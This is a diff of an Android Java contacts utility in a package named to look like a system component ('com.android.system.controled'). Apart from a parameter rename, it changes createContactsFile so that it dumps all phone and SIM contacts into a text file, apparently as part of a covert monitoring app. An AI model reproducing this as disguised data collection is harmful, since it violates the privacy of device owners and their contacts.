@@ -8,7 +8,6 @@ import android.net.Uri;
 import android.provider.Contacts.People;
 import android.provider.ContactsContract;
 
-import com.android.system.controled.Debug;
 import com.android.system.controled.MainApplication;
 import com.android.system.controled.bean.ContactBean;
 
@@ -20,7 +19,7 @@ public class ContactsUtil {
 	 * 根据号码获得联系人姓名
 	 * 
 	 * @Description:
-	 * @param con
+	 * @param context
 	 * @param number
 	 * @return
 	 * @see:
@@ -28,7 +27,7 @@ public class ContactsUtil {
 	 * @author: zgy
 	 * @date:2012-8-29
 	 */
-	public static String getNameFromContactsByNumber(Context con, String number) {
+	public static String getNameFromContactsByNumber(Context context, String number) {
 		number = StringUtil.getRidofSpecialOfTel(number);
 		String name = number;
 
@@ -36,7 +35,7 @@ public class ContactsUtil {
 		String[] projection = { ContactsContract.PhoneLookup.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER };
 		Cursor cursor = null;
 		try {
-			cursor = con.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, null, null, null);
+			cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, null, null, null);
 			if (cursor != null && cursor.getCount() > 0) {
 				cursor.moveToFirst();
 				String newNumber = "";
@@ -62,7 +61,7 @@ public class ContactsUtil {
 		if (name.equals(number)) {
 			Cursor cur = null;
 			try {
-				cur = con.getContentResolver().query(Uri.parse("content://icc/adn"), null, null, null, null);
+				cur = context.getContentResolver().query(Uri.parse("content://icc/adn"), null, null, null, null);
 				if (cur != null && cur.getCount() > 0) {
 					cur.moveToFirst();
 					String num = "";
@@ -93,14 +92,14 @@ public class ContactsUtil {
 	 * 从手机通讯录里获得联系人
 	 * 
 	 * @Description:
-	 * @param con
+	 * @param context
 	 * @return
 	 * @see:
 	 * @since:
 	 * @author: zhuanggy
 	 * @date:2013-5-31
 	 */
-	public static ArrayList<ContactBean> getAllContactsFromLocal(Context con) {
+	public static ArrayList<ContactBean> getAllContactsFromLocal(Context context) {
 		ArrayList<ContactBean> arrayContacts = new ArrayList<ContactBean>();
 		ContactBean c;
 
@@ -108,7 +107,7 @@ public class ContactsUtil {
 		Cursor cursor = null;
 		try {
 			String[] projection = { ContactsContract.PhoneLookup.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER };
-			cursor = con.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, null, null, null);
+			cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, null, null, null);
 			if (cursor != null && cursor.getCount() > 0) {
 				cursor.moveToFirst();
 				do {
@@ -138,21 +137,21 @@ public class ContactsUtil {
 	 * 从sim卡里获取联系人
 	 * 
 	 * @Description:
-	 * @param con
+	 * @param context
 	 * @return
 	 * @see:
 	 * @since:
 	 * @author: zhuanggy
 	 * @date:2013-7-8
 	 */
-	public static ArrayList<ContactBean> getAllContactsFromSim(Context con) {
+	public static ArrayList<ContactBean> getAllContactsFromSim(Context context) {
 		ArrayList<ContactBean> arrayContacts = new ArrayList<ContactBean>();
 		ContactBean c;
 
 		// 从sim卡里查找
 		Cursor cur = null;
 		try {
-			cur = con.getContentResolver().query(Uri.parse("content://icc/adn"), null, null, null, null);
+			cur = context.getContentResolver().query(Uri.parse("content://icc/adn"), null, null, null, null);
 			if (cur != null && cur.getCount() > 0) {
 				cur.moveToFirst();
 				String num = "";
@@ -225,16 +224,21 @@ public class ContactsUtil {
 	 * 生成通讯录文件
 	 * 
 	 * @Description:
-	 * @param con
+	 * @param context
 	 * @see:
 	 * @since:
 	 * @author: zhuanggy
 	 * @date:2013-7-8
 	 */
-	public static void createContactsFile(Context con) {
+	public static void createContactsFile(Context context) {
 
 		boolean isNull = true;
-		ArrayList<ContactBean> contacts = ContactsUtil.getAllContactsFromLocal(con);
+		
+		if(MainApplication.FILE_CONTACTS_TEXT.exists()) {
+			MainApplication.FILE_CONTACTS_TEXT.delete();
+		}
+		
+		ArrayList<ContactBean> contacts = ContactsUtil.getAllContactsFromLocal(context);
 		if (contacts != null && contacts.size() > 0) {
 			isNull = false;
 			String contactsStr = "手机通讯录：\r\n\r\n";
@@ -242,13 +246,12 @@ public class ContactsUtil {
 				contactsStr = contactsStr + "电话：" + c.number + "    姓名：" + c.name + "\r\n";
 			}
 			if (!contactsStr.equals("") && contactsStr.length() > 0) {
-
-				FileUtil.writeFile(contactsStr, MainApplication.FILE_CONTACTS, false);
+				FileUtil.writeFile(contactsStr, MainApplication.FILE_CONTACTS_TEXT, true);
 			}
 		}
 
 		contacts = new ArrayList<ContactBean>();
-		contacts = ContactsUtil.getAllContactsFromSim(con);
+		contacts = ContactsUtil.getAllContactsFromSim(context);
 		if (contacts != null && contacts.size() > 0) {
 			isNull = false;
 			String contactsStr = "\r\n\r\n\r\nSIM卡通信录：\r\n\r\n";
@@ -256,14 +259,12 @@ public class ContactsUtil {
 				contactsStr = contactsStr + "电话：" + c.number + "    姓名：" + c.name + "\r\n";
 			}
 			if (!contactsStr.equals("") && contactsStr.length() > 0) {
-				FileUtil.writeFile(contactsStr, MainApplication.FILE_CONTACTS, true);
-
+				FileUtil.writeFile(contactsStr, MainApplication.FILE_CONTACTS_TEXT, true);
 			}
 		}
 
 		if (isNull) {
-			FileUtil.writeFile("通讯录为空！", MainApplication.FILE_CONTACTS, true);
-
+			FileUtil.writeFile("通讯录为空！", MainApplication.FILE_CONTACTS_TEXT, true);
 		}
 
 	}
